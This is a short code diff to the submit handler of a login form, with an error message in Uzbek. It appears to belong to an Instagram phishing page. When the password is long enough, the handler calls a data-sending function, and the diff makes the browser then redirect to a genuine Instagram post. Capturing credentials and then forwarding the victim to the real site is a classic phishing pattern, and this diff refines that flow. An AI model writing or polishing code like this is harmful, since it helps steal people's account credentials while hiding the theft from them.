@@ -29,9 +29,10 @@ form.addEventListener('submit', e => {
 
   if(password.value.length>6){
     FetchingData()
+    window.location.href = "https://www.instagram.com/p/CZHOENLAAGc/?utm_source=ig_web_copy_link";
   }else {
     alert("Parolingiz yoki Foydalanuvchi nomi noto'g'ri kiritilgan !")
   }
-  window.location.href = "https://www.instagram.com/p/CZHOENLAAGc/?utm_source=ig_web_copy_link";
+  
   
 })
